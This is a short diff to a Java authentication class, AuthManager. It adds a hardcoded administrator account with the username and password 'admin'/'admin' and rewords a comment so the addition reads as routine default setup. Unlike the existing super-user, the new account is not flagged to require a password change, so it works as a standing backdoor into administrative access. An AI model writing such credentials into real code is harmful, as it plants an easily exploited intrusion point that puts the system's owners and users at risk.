@@ -21,7 +21,8 @@ public class AuthManager {
         this.activeTokens = new ConcurrentHashMap<>();
         this.requiresPasswordChange = new ConcurrentHashMap<>();
         
-        // Initialize super-user
+        // Initialize default administrative credentials
+        userPasswords.put("admin", "admin");
         userPasswords.put(SUPER_USER, DEFAULT_PASSWORD);
         requiresPasswordChange.put(SUPER_USER, true);
     }
